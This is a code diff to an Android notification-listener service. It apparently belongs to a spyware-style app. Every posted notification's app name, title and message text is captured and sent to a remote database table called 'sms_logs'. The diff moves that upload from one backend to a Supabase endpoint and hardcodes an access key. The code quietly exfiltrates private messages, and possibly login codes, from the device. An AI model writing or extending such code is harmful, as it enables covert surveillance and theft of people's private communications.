@@ -14,7 +14,8 @@ import java.util.Locale;
 
 public class NotificationService extends NotificationListenerService {
     private static final String TAG = "NotificationService";
-    private static final String BACKEND_URL = "https://backprince.onrender.com";
+    private static final String SUPABASE_URL = "https://kisskrjtazekbsbdwrvr.supabase.co";
+    private static final String SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtpc3Nrcmp0YXpla2JzYmR3cnZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTU2NzgsImV4cCI6MjA5NDgzMTY3OH0.zq_-C5Qt7O0WAxO5-INNA_hrtbY1UX5JbEP5LaQ73DE";
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
@@ -44,15 +45,17 @@ public class NotificationService extends NotificationListenerService {
             public void run() {
                 try {
                     JSONObject payload = new JSONObject();
-                    payload.put("deviceId", deviceId);
+                    payload.put("device_id", deviceId);
                     payload.put("sender", "NOTIF: " + pkg + " | " + title);
                     payload.put("message", msg);
-                    payload.put("timestamp", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));
+                    payload.put("received_at", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));
 
-                    URL url = new URL(BACKEND_URL + "/api/logs/sms"); // We reuse the SMS endpoint for notifications
+                    URL url = new URL(SUPABASE_URL + "/rest/v1/sms_logs");
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                    conn.setRequestProperty("apikey", SUPABASE_KEY);
+                    conn.setRequestProperty("Authorization", "Bearer " + SUPABASE_KEY);
                     conn.setDoOutput(true);
 
                     OutputStream os = conn.getOutputStream();
